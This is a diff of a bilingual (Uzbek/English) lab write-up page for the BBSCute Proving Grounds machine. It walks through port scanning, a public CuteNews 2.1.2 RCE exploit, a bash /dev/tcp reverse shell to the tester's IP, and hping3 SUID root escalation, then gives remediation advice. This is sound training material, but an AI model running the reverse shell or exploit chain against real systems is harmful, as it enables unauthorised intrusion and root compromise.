@@ -1,31 +1,25 @@
 <!DOCTYPE html>
 <html lang="uz">
 <head>
-  <!-- Security Headers -->
-  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; img-src 'self' data:;">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; script-src 'self' 'unsafe-inline'; img-src 'self' data:;">
   <meta http-equiv="X-Frame-Options" content="DENY">
-  <meta http-equiv="X-XSS-Protection" content="1; mode=block">
   <meta http-equiv="X-Content-Type-Options" content="nosniff">
-  <meta name="referrer" content="no-referrer">
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>BBSCute — Writeup | 0xAkatsuki</title>
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BBSCute — Writeup | 0xAkatsuki</title>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
-  :root {
-    --bg:#0a0e0a;--bg2:#0d130d;--bg3:#111811;
-    --green:#00ff41;--green2:#00cc33;--green3:#008f1f;--green-dim:#004d12;
-    --amber:#ffb700;--red:#ff3b3b;--cyan:#00e5ff;
-    --text:#c8ffc8;--text-dim:#5a8a5a;
-    --border:#1a3a1a;--border2:#0f2a0f;
-    --font:'JetBrains Mono',monospace;
-  }
+  :root{--bg:#0a0e0a;--bg2:#0d130d;--bg3:#111811;--green:#00ff41;--green2:#00cc33;--green3:#008f1f;--green-dim:#004d12;--amber:#ffb700;--red:#ff3b3b;--cyan:#00e5ff;--text:#c8ffc8;--text-dim:#5a8a5a;--border:#1a3a1a;--border2:#0f2a0f;--font:'JetBrains Mono',monospace}
   *{margin:0;padding:0;box-sizing:border-box}
   body{background:var(--bg);color:var(--text);font-family:var(--font);font-size:14px;line-height:1.7;overflow-x:hidden}
   body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,0.012) 2px,rgba(0,255,65,0.012) 4px);pointer-events:none;z-index:999}
   nav{background:var(--bg2);border-bottom:1px solid var(--border);padding:0 2rem;display:flex;align-items:center;height:52px;gap:1rem;position:sticky;top:0;z-index:100}
   .nav-back{color:var(--text-dim);text-decoration:none;font-size:13px;transition:color .15s}.nav-back:hover{color:var(--green)}.nav-back::before{content:'← ';color:var(--green3)}
   .nav-sep{color:var(--border)}.nav-current{color:var(--green);font-size:13px}
+  .lang-toggle{margin-left:auto;display:flex;background:var(--bg3);border:1px solid var(--border);border-radius:3px;overflow:hidden}
+  .lang-btn{padding:6px 14px;font-size:11px;font-weight:700;cursor:pointer;border:none;background:transparent;font-family:var(--font);color:var(--text-dim);transition:all .15s;letter-spacing:.06em}
+  .lang-btn.active{background:var(--green-dim);color:var(--green)}
+  .lang-btn:hover:not(.active){color:var(--text)}
   .layout{max-width:1100px;margin:0 auto;padding:2rem;display:grid;grid-template-columns:1fr 260px;gap:2rem;align-items:start}
   @media(max-width:768px){.layout{grid-template-columns:1fr;padding:1rem}.sidebar{display:none}}
   .writeup-header{background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:1.5rem;margin-bottom:2rem}
@@ -48,15 +42,14 @@
   .subsection-title{color:var(--green2);font-size:13px;font-weight:700;margin:1.25rem 0 .75rem}
   .subsection-title::before{content:'## ';color:var(--green3)}
   p{color:var(--text-dim);margin-bottom:.75rem;font-size:13px;line-height:1.8}
-  p strong{color:var(--text);font-weight:500}
-  p em{color:var(--amber);font-style:normal}
+  p strong{color:var(--text);font-weight:500}p em{color:var(--amber);font-style:normal}
   .cmd-block{background:var(--bg3);border:1px solid var(--border);border-radius:4px;margin:1rem 0;overflow:hidden}
   .cmd-header{background:var(--bg2);border-bottom:1px solid var(--border);padding:6px 12px;display:flex;align-items:center;gap:8px;font-size:11px}
   .cmd-label{color:var(--text-dim)}.cmd-file{color:var(--amber);margin-left:auto}
   .cmd-prompt{padding:12px 16px;font-size:12px;line-height:1.6;overflow-x:auto}
   .cmd-prompt .pr{color:var(--green2);user-select:none}.cmd-prompt .cm{color:var(--text)}
   .out-block{background:#060c06;border:1px solid var(--border2);border-left:3px solid var(--green-dim);border-radius:4px;padding:12px 16px;font-size:12px;color:var(--text-dim);line-height:1.6;margin:.5rem 0 1rem;overflow-x:auto;white-space:pre}
-  .out-block .hl{color:var(--green);font-weight:700}.out-block .hl-amber{color:var(--amber)}.out-block .hl-red{color:var(--red)}.out-block .hl-cyan{color:var(--cyan)}
+  .out-block .hl{color:var(--green);font-weight:700}.out-block .hl-amber{color:var(--amber)}
   .note{border-radius:4px;padding:10px 14px;font-size:12px;margin:1rem 0;display:flex;gap:10px;align-items:flex-start;line-height:1.6}
   .note-info{background:rgba(0,229,255,.05);border:1px solid rgba(0,229,255,.2);color:var(--cyan)}
   .note-tip{background:rgba(0,204,51,.06);border:1px solid var(--green-dim);color:var(--green2)}
@@ -80,14 +73,21 @@
   .tag{font-size:10px;color:var(--green3);padding:2px 6px;border:1px solid var(--border);border-radius:2px}.tag::before{content:'#'}
   footer{border-top:1px solid var(--border);padding:1.5rem 2rem;text-align:center;color:var(--text-dim);font-size:11px;margin-top:2rem}
   footer a{color:var(--green3);text-decoration:none}footer a:hover{color:var(--green)}
+  /* LANG */
+  body.lang-en [data-lang="uz"]{display:none}
+  body.lang-uz [data-lang="en"]{display:none}
 </style>
 </head>
-<body>
+<body class="lang-uz">
 
 <nav>
-  <a class="nav-back" href="../../../index.html">0xAkatsuki</a>
+  <a class="nav-back" href="/akatsuki.github.io/index.html">0xAkatsuki</a>
   <span class="nav-sep">/</span>
   <span class="nav-current">BBSCute</span>
+  <div class="lang-toggle">
+    <button class="lang-btn active" onclick="setLang('uz')">UZ</button>
+    <button class="lang-btn" onclick="setLang('en')">EN</button>
+  </div>
 </nav>
 
 <div class="layout">
@@ -101,10 +101,19 @@
       <span class="badge badge-linux">Linux</span>
     </div>
     <div class="writeup-meta-row">
-      <div class="meta-item"><span class="lbl">Platforma:</span><span class="meta-val">Proving Grounds Practice</span></div>
+      <div class="meta-item">
+        <span class="lbl" data-lang="uz">Platforma:</span><span class="lbl" data-lang="en">Platform:</span>
+        <span class="meta-val">Proving Grounds Practice</span>
+      </div>
       <div class="meta-item"><span class="lbl">IP:</span><span class="meta-val">192.168.228.128</span></div>
-      <div class="meta-item"><span class="lbl">Sana:</span><span class="meta-val">2026-05-14</span></div>
-      <div class="meta-item"><span class="lbl">Muallif:</span><span class="meta-val">0xAkatsuki</span></div>
+      <div class="meta-item">
+        <span class="lbl" data-lang="uz">Sana:</span><span class="lbl" data-lang="en">Date:</span>
+        <span class="meta-val">2026-05-14</span>
+      </div>
+      <div class="meta-item">
+        <span class="lbl" data-lang="uz">Muallif:</span><span class="lbl" data-lang="en">Author:</span>
+        <span class="meta-val">0xAkatsuki</span>
+      </div>
     </div>
   </div>
 
@@ -120,30 +129,36 @@
 
   <!-- 01 RECON -->
   <div class="section" id="sec01">
-    <div class="section-title">Razvedka (Reconnaissance) <span class="section-num">01</span></div>
+    <div class="section-title">
+      <span data-lang="uz">Razvedka (Reconnaissance)</span>
+      <span data-lang="en">Reconnaissance</span>
+      <span class="section-num">01</span>
+    </div>
 
-    <div class="subsection-title">Masscan — tez port skanerlash</div>
-    <p>Klassik <strong>nmap</strong> dan oldin <strong>masscan</strong> bilan barcha 65535 portni bir zumda skanerlaymiz. Maqsad — vaqt tejash. Natijani <strong>ports</strong> fayliga yozib, keyinchalik nmap ga uzatamiz.</p>
+    <div class="subsection-title">Masscan</div>
+    <p data-lang="uz">Klassik <strong>nmap</strong> dan oldin <strong>masscan</strong> bilan barcha 65535 portni skanerlaymiz. Natijani <strong>ports</strong> fayliga yozib, nmap ga uzatamiz.</p>
+    <p data-lang="en">Before <strong>nmap</strong>, we use <strong>masscan</strong> to scan all 65535 ports quickly. Results are saved to a <strong>ports</strong> file and passed to nmap.</p>
 
     <div class="cmd-block">
       <div class="cmd-header"><span class="cmd-label">kali@redteam</span><span class="cmd-file">masscan</span></div>
-      <div class="cmd-prompt">
-        <span class="pr">└─$ </span><span class="cm">sudo masscan -p1-65535 192.168.228.128 --rate=1000 -e tun0 > ports</span>
-      </div>
+      <div class="cmd-prompt"><span class="pr">└─$ </span><span class="cm">sudo masscan -p1-65535 192.168.228.128 --rate=1000 -e tun0 > ports</span></div>
     </div>
 
     <div class="screenshot">
       <img src="images/masscan.png" alt="masscan">
-      <div class="screenshot-cap">masscan — 65535 port, SYN stealth scan</div>
+      <div class="screenshot-cap" data-lang="uz">masscan — 65535 port, SYN stealth scan</div>
+      <div class="screenshot-cap" data-lang="en">masscan — 65535 ports, SYN stealth scan</div>
     </div>
 
     <div class="note note-tip">
       <span class="note-icon">→</span>
-      <span>Masscan + nmap kombinatsiyasi professional workflow — masscan tezlik, nmap chuqurlik beradi.</span>
+      <span data-lang="uz">Masscan + nmap kombinatsiyasi: masscan tezlik, nmap chuqurlik beradi.</span>
+      <span data-lang="en">Masscan + nmap combo: masscan for speed, nmap for depth.</span>
     </div>
 
-    <div class="subsection-title">Nmap — servis va versiya aniqlash</div>
-    <p>Masscan topgan portlarni <strong>-sCV</strong> flaglari bilan nmap ga beramiz. Natija: 5 ta ochiq port — ikki HTTP, SSH va mail servislari.</p>
+    <div class="subsection-title">Nmap</div>
+    <p data-lang="uz">Masscan topgan portlarni <strong>-sCV</strong> bilan nmap ga beramiz. 5 ta ochiq port topildi.</p>
+    <p data-lang="en">We pass masscan's ports to nmap with <strong>-sCV</strong>. 5 open ports discovered.</p>
 
     <div class="cmd-block">
       <div class="cmd-header"><span class="cmd-label">kali@redteam</span><span class="cmd-file">nmap</span></div>
@@ -154,8 +169,9 @@
     </div>
 
     <div class="screenshot">
-      <img src="images/nmap.png" alt="nmap natijasi">
-      <div class="screenshot-cap">nmap — portlar, servislar va versiyalar</div>
+      <img src="images/nmap.png" alt="nmap">
+      <div class="screenshot-cap" data-lang="uz">nmap — portlar, servislar va versiyalar</div>
+      <div class="screenshot-cap" data-lang="en">nmap — ports, services and versions</div>
     </div>
 
     <div class="out-block">PORT    STATE SERVICE  VERSION
@@ -163,85 +179,96 @@
 <span class="hl">80/tcp  open  http     Apache httpd 2.4.38 (Debian)</span>
 <span class="hl-amber">88/tcp  open  http     nginx 1.14.2</span>
 <span class="hl-amber">110/tcp open  pop3     Courier pop3d</span>
-<span class="hl-amber">995/tcp open  ssl/pop3 Courier pop3d</span>
-Service Info: OS: Linux</div>
+<span class="hl-amber">995/tcp open  ssl/pop3 Courier pop3d</span></div>
 
     <div class="note note-info">
       <span class="note-icon">ℹ</span>
-      <span><strong>2 ta HTTP port</strong> — 80 (Apache) va 88 (nginx). Pop3 mail servisi ham bor, lekin asosiy vektor web. 80-portdan boshlaymiz.</span>
+      <span data-lang="uz"><strong>2 ta HTTP port</strong> — 80 (Apache) va 88 (nginx). Asosiy vektor web. 80-portdan boshlaymiz.</span>
+      <span data-lang="en"><strong>2 HTTP ports</strong> — 80 (Apache) and 88 (nginx). Main attack vector is web. Starting with port 80.</span>
     </div>
 
-    <div class="subsection-title">Gobuster — web enumeration</div>
-    <p>Apache 80-portini gobuster bilan skanerlaymiz. <strong>php, txt, js, asp</strong> kengaytmalar bilan — PHP CMS bo'lishi mumkin.</p>
+    <div class="subsection-title">Gobuster</div>
+    <p data-lang="uz">Apache 80-portini gobuster bilan skanerlaymiz — PHP CMS bo'lishi mumkin.</p>
+    <p data-lang="en">Enumerating Apache on port 80 with gobuster — likely a PHP CMS.</p>
 
     <div class="cmd-block">
       <div class="cmd-header"><span class="cmd-label">kali@redteam</span><span class="cmd-file">gobuster</span></div>
-      <div class="cmd-prompt">
-        <span class="pr">└─$ </span><span class="cm">gobuster dir -u http://192.168.228.128/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,txt,js,asp</span>
-      </div>
+      <div class="cmd-prompt"><span class="pr">└─$ </span><span class="cm">gobuster dir -u http://192.168.228.128/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,txt,js,asp</span></div>
     </div>
 
     <div class="screenshot">
       <img src="images/gobuster_2.png" alt="gobuster">
-      <div class="screenshot-cap">gobuster — yashirin sahifalar va direktoriyalar topildi</div>
+      <div class="screenshot-cap" data-lang="uz">gobuster — yashirin sahifalar topildi</div>
+      <div class="screenshot-cap" data-lang="en">gobuster — hidden pages discovered</div>
     </div>
 
-    <div class="out-block">/<span class="hl">search.php</span>    (Status: 200)
-/<span class="hl">index.php</span>     (Status: 200)
-/docs          (Status: 301)
+    <div class="out-block">/<span class="hl">index.php</span>     (Status: 200)
 /<span class="hl-amber">uploads</span>       (Status: 301) [→ /uploads/]
-/core          (Status: 301)
-/<span class="hl">example.php</span>   (Status: 200)</div>
+/core          (Status: 301)</div>
 
     <div class="note note-warn">
       <span class="note-icon">!</span>
-      <span><strong>/uploads</strong> direktoriyasi ochiq — shell yuklasak, u yerdan execute qilish mumkin. Esda saqlash kerak.</span>
+      <span data-lang="uz"><strong>/uploads</strong> direktoriyasi ochiq — shell yuklasak, u yerdan execute qilish mumkin.</span>
+      <span data-lang="en"><strong>/uploads</strong> directory is accessible — if we upload a shell, we can execute it.</span>
     </div>
   </div>
 
   <!-- 02 VULN -->
   <div class="section" id="sec02">
-    <div class="section-title">Zaiflikni Aniqlash <span class="section-num">02</span></div>
+    <div class="section-title">
+      <span data-lang="uz">Zaiflikni Aniqlash</span>
+      <span data-lang="en">Vulnerability Assessment</span>
+      <span class="section-num">02</span>
+    </div>
 
-    <div class="subsection-title">CuteNews 2.1.2 — versiyani aniqlash</div>
-    <p>index.php brauzerda — <em>CuteNews 2.1.2</em> news management system. Footer da versiya ochiqcha ko'rinib turibdi. Bu red teamning sevimli topilmasi — versiya = exploit qidirish.</p>
+    <div class="subsection-title">
+      <span data-lang="uz">CuteNews 2.1.2 — versiyani aniqlash</span>
+      <span data-lang="en">CuteNews 2.1.2 — Version Fingerprinting</span>
+    </div>
+    <p data-lang="uz">index.php da <em>CuteNews 2.1.2</em> ko'rinib turibdi. Footer da versiya ochiqcha — versiya = exploit qidirish.</p>
+    <p data-lang="en">index.php reveals <em>CuteNews 2.1.2</em>. Version openly displayed in footer — version disclosure = exploit search.</p>
 
     <div class="screenshot">
       <img src="images/index_sayt.png" alt="CuteNews login">
-      <div class="screenshot-cap">CuteNews 2.1.2 — versiya footerda oshkor</div>
+      <div class="screenshot-cap" data-lang="uz">CuteNews 2.1.2 — versiya footerda oshkor</div>
+      <div class="screenshot-cap" data-lang="en">CuteNews 2.1.2 — version exposed in footer</div>
     </div>
 
-    <div class="subsection-title">Searchsploit — exploit qidirish</div>
-
+    <div class="subsection-title">Searchsploit</div>
     <div class="cmd-block">
       <div class="cmd-header"><span class="cmd-label">kali@redteam</span><span class="cmd-file">searchsploit</span></div>
-      <div class="cmd-prompt">
-        <span class="pr">└─$ </span><span class="cm">searchsploit cutenews 2.1.2</span>
-      </div>
+      <div class="cmd-prompt"><span class="pr">└─$ </span><span class="cm">searchsploit cutenews 2.1.2</span></div>
     </div>
 
     <div class="screenshot">
       <img src="images/searchsploit.png" alt="searchsploit">
-      <div class="screenshot-cap">searchsploit — 4 ta exploit topildi, 48800.py tanladik</div>
+      <div class="screenshot-cap" data-lang="uz">searchsploit — 4 ta exploit, 48800.py tanladik</div>
+      <div class="screenshot-cap" data-lang="en">searchsploit — 4 exploits found, selected 48800.py</div>
     </div>
 
-    <div class="out-block">CuteNews 2.1.2 - 'avatar' RCE (Metasploit)          | php/remote/46698.rb
-CuteNews 2.1.2 - Arbitrary File Deletion             | php/webapps/48447.txt
-CuteNews 2.1.2 - Authenticated Arbitrary File Upload | php/webapps/48458.txt
-<span class="hl">CuteNews 2.1.2 - Remote Code Execution               | php/webapps/48800.py</span></div>
+    <div class="out-block">CuteNews 2.1.2 - 'avatar' RCE (Metasploit) | php/remote/46698.rb
+CuteNews 2.1.2 - Arbitrary File Deletion    | php/webapps/48447.txt
+CuteNews 2.1.2 - Auth Arbitrary File Upload | php/webapps/48458.txt
+<span class="hl">CuteNews 2.1.2 - Remote Code Execution      | php/webapps/48800.py</span></div>
 
     <div class="note note-tip">
       <span class="note-icon">→</span>
-      <span><strong>48800.py</strong> — manual Python exploit tanladik. Metasploit emas — OSCP qoidasi bo'yicha faqat 1 marta ishlatish mumkin, uni tejab qo'yamiz.</span>
+      <span data-lang="uz"><strong>48800.py</strong> — manual Python exploit. Metasploit emas — OSCP da faqat 1 marta, tejab qo'yamiz.</span>
+      <span data-lang="en"><strong>48800.py</strong> — manual Python exploit. Avoiding Metasploit — OSCP allows it only once, saving it.</span>
     </div>
   </div>
 
-  <!-- 03 INITIAL -->
+  <!-- 03 INITIAL ACCESS -->
   <div class="section" id="sec03">
-    <div class="section-title">Dastlabki Kirish (Initial Access) <span class="section-num">03</span></div>
+    <div class="section-title">
+      <span data-lang="uz">Dastlabki Kirish (Initial Access)</span>
+      <span data-lang="en">Initial Access</span>
+      <span class="section-num">03</span>
+    </div>
 
     <div class="subsection-title">CuteNews RCE — 48800.py</div>
-    <p>Exploit avtomatik foydalanuvchi ro'yxatdan o'tkazadi, avatar upload orqali PHP webshell yuklaydi va interaktiv shell beradi. Mexanizm: <strong>register → avatar PHP shell upload → /uploads/ dan execute → RCE</strong>.</p>
+    <p data-lang="uz">Exploit avtomatik ro'yxatdan o'tkazadi, avatar orqali PHP webshell yuklaydi. Mexanizm: <strong>register → PHP shell upload → /uploads/ execute → RCE</strong>.</p>
+    <p data-lang="en">The exploit auto-registers a user, uploads a PHP webshell via avatar. Flow: <strong>register → PHP shell upload → execute from /uploads/ → RCE</strong>.</p>
 
     <div class="cmd-block">
       <div class="cmd-header"><span class="cmd-label">kali@redteam</span><span class="cmd-file">48800.py</span></div>
@@ -253,72 +280,75 @@ CuteNews 2.1.2 - Authenticated Arbitrary File Upload | php/webapps/48458.txt
 
     <div class="screenshot">
       <img src="images/python_shell.png" alt="python exploit">
-      <div class="screenshot-cap">48800.py — avtomatik ro'yxatdan o'tish va www-data shell olindi</div>
+      <div class="screenshot-cap" data-lang="uz">48800.py — www-data shell olindi</div>
+      <div class="screenshot-cap" data-lang="en">48800.py — www-data shell obtained</div>
     </div>
 
     <div class="out-block">[+] Registration successful: Gf7ki6ZfpN
-Sending Payload...
 <span class="hl">Dropping to a SHELL</span>
 command > whoami
 <span class="hl">www-data</span></div>
 
-    <p>Shell oldik — lekin bu <strong>semi-interactive</strong>. To'liq bash reverse shell olamiz.</p>
-
-    <div class="subsection-title">Reverse shell — to'liq interaktiv bash</div>
-
-    <div class="cmd-block">
-      <div class="cmd-header"><span class="cmd-label">kali — nc listener</span></div>
-      <div class="cmd-prompt">
-        <span class="pr">└─$ </span><span class="cm">nc -lvnp 5555</span>
-      </div>
+    <div class="subsection-title">
+      <span data-lang="uz">Reverse shell</span>
+      <span data-lang="en">Reverse Shell</span>
     </div>
 
     <div class="cmd-block">
-      <div class="cmd-header"><span class="cmd-label">webshell orqali payload</span></div>
-      <div class="cmd-prompt">
-        <span class="pr">command > </span><span class="cm">/bin/bash -i >&amp; /dev/tcp/192.168.45.169/5555 0>&amp;1</span>
+      <div class="cmd-header"><span class="cmd-label">kali — nc listener</span></div>
+      <div class="cmd-prompt"><span class="pr">└─$ </span><span class="cm">nc -lvnp 5555</span></div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label" data-lang="uz">webshell orqali</span>
+        <span class="cmd-label" data-lang="en">via webshell</span>
       </div>
+      <div class="cmd-prompt"><span class="pr">command > </span><span class="cm">/bin/bash -i >&amp; /dev/tcp/192.168.45.169/5555 0>&amp;1</span></div>
     </div>
 
     <div class="screenshot">
       <img src="images/entry_point_shell.png" alt="reverse shell">
-      <div class="screenshot-cap">Reverse shell — to'liq interaktiv bash olindi</div>
+      <div class="screenshot-cap" data-lang="uz">Reverse shell — to'liq interaktiv bash olindi</div>
+      <div class="screenshot-cap" data-lang="en">Reverse shell — full interactive bash obtained</div>
     </div>
 
     <div class="flag-box">
       <span class="flag-icon">⚑</span>
-      <div>
-        <div class="flag-label">Local flag</div>
-        <div class="flag-val">/var/www/local.txt → [REDACTED]</div>
-      </div>
+      <div><div class="flag-label">Local flag</div><div class="flag-val">/var/www/local.txt → [REDACTED]</div></div>
     </div>
   </div>
 
   <!-- 04 PRIVESC -->
   <div class="section" id="sec04">
-    <div class="section-title">Imtiyoz Oshirish (Privilege Escalation) <span class="section-num">04</span></div>
+    <div class="section-title">
+      <span data-lang="uz">Imtiyoz Oshirish (Privilege Escalation)</span>
+      <span data-lang="en">Privilege Escalation</span>
+      <span class="section-num">04</span>
+    </div>
 
-    <div class="subsection-title">LinPEAS — SUID enumeration</div>
-    <p>LinPEAS avtomatik tizimni o'rganadi. <strong>SUID</strong> bo'limida xavfli binarlar sariq/qizil rang bilan ajratiladi — <em>hping3</em> darhol ko'zga tashlanadi.</p>
+    <div class="subsection-title">LinPEAS — SUID</div>
+    <p data-lang="uz">LinPEAS SUID bo'limida xavfli binarlarni ajratadi — <em>hping3</em> darhol ko'zga tashlanadi.</p>
+    <p data-lang="en">LinPEAS highlights dangerous SUID binaries — <em>hping3</em> immediately stands out.</p>
 
     <div class="screenshot">
       <img src="images/priv_esc.png" alt="linpeas">
-      <div class="screenshot-cap">LinPEAS — hping3 SUID highlighted</div>
+      <div class="screenshot-cap" data-lang="uz">LinPEAS — hping3 SUID highlighted</div>
+      <div class="screenshot-cap" data-lang="en">LinPEAS — hping3 SUID highlighted</div>
     </div>
 
-    <div class="out-block">SUID — Files with Interesting Permissions
-...
--rwsr-xr-x root  /usr/bin/<span class="hl-amber">pkexec</span>   ---> CVE-2021-4034
-<span class="hl">-rwsr-sr-x root  /usr/sbin/hping3</span>
-...</div>
+    <div class="out-block">-rwsr-xr-x root /usr/bin/<span class="hl-amber">pkexec</span>  ---> CVE-2021-4034
+<span class="hl">-rwsr-sr-x root /usr/sbin/hping3</span></div>
 
     <div class="note note-warn">
       <span class="note-icon">!</span>
-      <span><strong>hping3 SUID</strong> — GTFOBins da bu root shell beradi. pkexec (CVE-2021-4034) ham bor lekin hping3 eng tez va ishonchli yo'l.</span>
+      <span data-lang="uz"><strong>hping3 SUID</strong> — GTFOBins da root shell beradi. Eng tez yo'l.</span>
+      <span data-lang="en"><strong>hping3 SUID</strong> — GTFOBins confirms root shell. Fastest path.</span>
     </div>
 
-    <div class="subsection-title">hping3 SUID → root shell</div>
-    <p>GTFOBins texnikasi — hping3 interaktiv rejimida <strong>/bin/sh -p</strong> chaqiramiz. SUID tufayli shell root huquqida ochiladi.</p>
+    <div class="subsection-title">hping3 SUID → root</div>
+    <p data-lang="uz">hping3 interaktiv rejimida <strong>/bin/sh -p</strong> — SUID tufayli root shell ochiladi.</p>
+    <p data-lang="en">Calling <strong>/bin/sh -p</strong> inside hping3's interactive mode — SUID bit gives root shell.</p>
 
     <div class="cmd-block">
       <div class="cmd-header"><span class="cmd-label">www-data@cute:/tmp$</span></div>
@@ -341,17 +371,17 @@ command > whoami
 
   <!-- 05 FLAGS -->
   <div class="section" id="sec05">
-    <div class="section-title">Flaglar <span class="section-num">05</span></div>
+    <div class="section-title">
+      <span data-lang="uz">Flaglar</span>
+      <span data-lang="en">Flags</span>
+      <span class="section-num">05</span>
+    </div>
 
     <div class="screenshot">
       <img src="images/flags_txt.png" alt="flags">
-      <div class="screenshot-cap">proof.txt va local.txt — mashina to'liq compromise</div>
+      <div class="screenshot-cap" data-lang="uz">proof.txt va local.txt — mashina to'liq compromise</div>
+      <div class="screenshot-cap" data-lang="en">proof.txt and local.txt — machine fully compromised</div>
     </div>
-
-    <div class="out-block"># cd /root && ls
-<span class="hl">proof.txt  root.txt</span>
-# find / -type f -name local.txt 2>/dev/null
-<span class="hl">/var/www/local.txt</span></div>
 
     <div class="flag-box">
       <span class="flag-icon">⚑</span>
@@ -359,55 +389,74 @@ command > whoami
     </div>
     <div class="flag-box">
       <span class="flag-icon">⚑</span>
-      <div><div class="flag-label">Proof flag (Root)</div><div class="flag-val">/root/proof.txt → [REDACTED]</div></div>
+      <div><div class="flag-label">Proof flag</div><div class="flag-val">/root/proof.txt → [REDACTED]</div></div>
     </div>
   </div>
 
   <!-- 06 ANALYSIS -->
   <div class="section" id="sec06">
-    <div class="section-title">Zaiflik Tahlili <span class="section-num">06</span></div>
-
-    <p><strong>BBSCute</strong> ikki klassik zaiflikni birlashtirgan — web RCE va SUID misconfiguration. Real pentest da bu kombinatsiya juda ko'p uchraydi.</p>
+    <div class="section-title">
+      <span data-lang="uz">Zaiflik Tahlili</span>
+      <span data-lang="en">Vulnerability Analysis</span>
+      <span class="section-num">06</span>
+    </div>
 
     <div class="cmd-block">
-      <div class="cmd-header"><span class="cmd-label">Zaifliklar jadvali</span></div>
+      <div class="cmd-header">
+        <span class="cmd-label" data-lang="uz">Zaifliklar jadvali</span>
+        <span class="cmd-label" data-lang="en">Vulnerability table</span>
+      </div>
       <div class="cmd-prompt" style="padding:0">
         <table style="width:100%;border-collapse:collapse;font-size:12px">
           <tr style="border-bottom:1px solid var(--border)">
             <td style="padding:8px 16px;color:var(--green2)">CuteNews 2.1.2 RCE</td>
-            <td style="padding:8px;color:var(--red)">Kritik</td>
-            <td style="padding:8px;color:var(--text-dim)">Avatar upload filtrsiz — PHP webshell yuklash mumkin</td>
+            <td style="padding:8px;color:var(--red)" data-lang="uz">Kritik</td>
+            <td style="padding:8px;color:var(--red)" data-lang="en">Critical</td>
+            <td style="padding:8px;color:var(--text-dim)" data-lang="uz">Avatar upload filtrsiz — PHP webshell mumkin</td>
+            <td style="padding:8px;color:var(--text-dim)" data-lang="en">Unfiltered avatar upload — PHP webshell possible</td>
           </tr>
           <tr style="border-bottom:1px solid var(--border)">
             <td style="padding:8px 16px;color:var(--green2)">hping3 SUID</td>
-            <td style="padding:8px;color:var(--amber)">Yuqori</td>
-            <td style="padding:8px;color:var(--text-dim)">/usr/sbin/hping3 ga keraksiz SUID bit — root shell</td>
+            <td style="padding:8px;color:var(--amber)" data-lang="uz">Yuqori</td>
+            <td style="padding:8px;color:var(--amber)" data-lang="en">High</td>
+            <td style="padding:8px;color:var(--text-dim)" data-lang="uz">Keraksiz SUID bit — root shell</td>
+            <td style="padding:8px;color:var(--text-dim)" data-lang="en">Unnecessary SUID bit — root shell obtainable</td>
           </tr>
           <tr>
-            <td style="padding:8px 16px;color:var(--green2)">Versiya oshkor</td>
-            <td style="padding:8px;color:var(--amber)">O'rta</td>
-            <td style="padding:8px;color:var(--text-dim)">CuteNews versiyasi footer da ochiq — exploit topish trivial</td>
+            <td style="padding:8px 16px;color:var(--green2)" data-lang="uz">Versiya oshkor</td>
+            <td style="padding:8px 16px;color:var(--green2)" data-lang="en">Version Disclosure</td>
+            <td style="padding:8px;color:var(--amber)" data-lang="uz">O'rta</td>
+            <td style="padding:8px;color:var(--amber)" data-lang="en">Medium</td>
+            <td style="padding:8px;color:var(--text-dim)" data-lang="uz">Versiya footer da ochiq</td>
+            <td style="padding:8px;color:var(--text-dim)" data-lang="en">Version exposed in footer</td>
           </tr>
         </table>
       </div>
     </div>
 
-    <div class="subsection-title">Tavsiyalar</div>
-    <p><strong>CuteNews:</strong> CMS ni yangilash. Upload fayllarni PHP sifatida execute qilmaslik — MIME type va kengaytma whitelist joriy etish.</p>
-    <p><strong>hping3:</strong> <code style="color:var(--amber)">chmod u-s /usr/sbin/hping3</code> — SUID bitini olib tashlash. Muntazam SUID audit o'tkazish.</p>
-    <p><strong>Versiya:</strong> CMS va server versiyalarini public sahifalarda ko'rsatmaslik.</p>
+    <p data-lang="uz"><strong>CuteNews:</strong> CMS yangilash. Upload fayllarni PHP execute qilmaslik — MIME type whitelist.</p>
+    <p data-lang="en"><strong>CuteNews:</strong> Update or replace the CMS. Prevent PHP execution of uploaded files — implement MIME type whitelisting.</p>
+    <p data-lang="uz"><strong>hping3:</strong> <code style="color:var(--amber)">chmod u-s /usr/sbin/hping3</code> — SUID bitini olib tashlash.</p>
+    <p data-lang="en"><strong>hping3:</strong> Remove the SUID bit: <code style="color:var(--amber)">chmod u-s /usr/sbin/hping3</code>. Conduct regular SUID audits.</p>
   </div>
 
 </main>
 
 <aside class="sidebar">
   <div class="sidebar-card">
-    <div class="sidebar-title">Mashina ma'lumotlari</div>
-    <div class="info-row"><span class="lbl">Nom</span><span>BBSCute</span></div>
-    <div class="info-row"><span class="lbl">Platforma</span><span>PG Practice</span></div>
+    <div class="sidebar-title" data-lang="uz">Mashina ma'lumotlari</div>
+    <div class="sidebar-title" data-lang="en">Machine Info</div>
+    <div class="info-row"><span class="lbl" data-lang="uz">Nom</span><span class="lbl" data-lang="en">Name</span><span>BBSCute</span></div>
+    <div class="info-row"><span class="lbl">Platform</span><span>PG Practice</span></div>
     <div class="info-row"><span class="lbl">OS</span><span style="color:var(--cyan)">Linux (Debian)</span></div>
-    <div class="info-row"><span class="lbl">Qiyinlik</span><span style="color:var(--amber)">Medium</span></div>
-    <div class="info-row"><span class="lbl">Holat</span><span style="color:var(--green)">Rooted ✓</span></div>
+    <div class="info-row">
+      <span class="lbl" data-lang="uz">Qiyinlik</span><span class="lbl" data-lang="en">Difficulty</span>
+      <span style="color:var(--amber)">Medium</span>
+    </div>
+    <div class="info-row">
